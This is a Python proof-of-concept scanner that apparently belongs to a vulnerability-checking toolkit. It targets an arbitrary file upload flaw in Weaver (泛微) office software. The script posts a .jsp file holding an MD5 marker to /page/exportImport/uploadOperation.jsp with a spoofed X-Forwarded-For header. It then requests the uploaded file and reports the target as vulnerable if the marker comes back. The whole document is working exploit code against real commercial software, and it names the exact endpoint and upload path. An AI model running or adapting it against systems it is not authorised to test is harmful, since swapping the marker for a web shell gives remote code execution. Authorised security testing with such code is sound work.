import requests
from lib.get_normal_url import get_standard_url
def poc(target):
    try:
        target = get_standard_url(target)
        upload_url = target + '/page/exportImport/uploadOperation.jsp'
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=---------------------------WebKitFormBoundary6XgyjB6SeCArD3Hc"}
        data = "------WebKitFormBoundary6XgyjB6SeCArD3Hc\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test123.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n202cb962ac59075b964b07152d234b70\r\n------WebKitFormBoundary6XgyjB6SeCArD3Hc--"
        res = requests.post(upload_url, headers=headers, data=data)
        res1 = requests.get(target + "/page/exportImport/fileTransfer/test123.jsp")
        if "202cb962ac59075b964b07152d234b70" in res1.text and res1.status_code == 200:
            print("\033[0;31m 存在泛微任意文件上传漏洞："+upload_url)
    except:
        pass
